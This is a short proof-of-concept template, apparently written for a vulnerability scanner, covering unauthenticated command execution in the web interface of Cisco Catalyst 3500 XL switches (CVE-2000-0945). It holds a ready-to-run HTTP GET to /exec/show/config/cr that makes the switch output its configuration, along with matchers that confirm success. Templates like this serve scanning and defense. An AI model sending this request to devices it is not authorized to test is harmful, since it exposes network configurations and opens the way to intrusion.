[info]
author = "AVE"
description = "Cisco Catalyst 3500 XL 系列交换机 Web 配置接口存在未授权命令执行漏洞。通过向 /exec/show/config/cr 发送 HTTP GET 请求，可读取交换机配置信息，验证漏洞存在。"
id = "POC-AVE-2000-0691"
name = "Cisco Catalyst 3500 XL 任意命令执行漏洞 PoC"
severity = "critical"
tags = ["ave-2000-0691"]
vuln_id = [
    "CVE-2000-0945",
    "AVE-2000-0691",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/exec/show/config/cr"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "show",
    "config",
    "running-config",
]
